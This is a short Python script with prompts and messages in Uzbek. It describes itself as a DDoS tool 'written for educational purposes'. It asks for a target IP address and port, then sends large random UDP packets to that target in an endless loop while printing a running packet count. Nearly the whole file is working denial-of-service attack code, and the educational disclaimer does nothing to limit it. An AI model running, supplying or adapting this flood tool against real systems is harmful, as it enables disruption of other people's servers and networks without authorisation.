import socket, os, time, random
def runddos():
    print("[WARNING] Ushbu DDOS vositasi o'quv maqsadida yozildi. Kompyuter CPU yoki GPU xotiralarga ta'sir qilishi mumkin.")


    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    packet = random._urandom(21110)

    port = int(input("--[#]-- Istalgan portingizni kiriting:  "))

    ip = input("--[#]-- Nishon IP adressini kiritning:  ")

    sent = 0

    try:

        while True:
            s.sendto(packet, (ip, port))
            sent += 1
            print("--[#]-- DDOS HUJUM QILINYAPTI {} port - {} ip - {} Packetlar soni".format(port, ip, sent))
    except KeyboardInterrupt:
        print("[STOPPED] Dastur to'xtatildiℹ")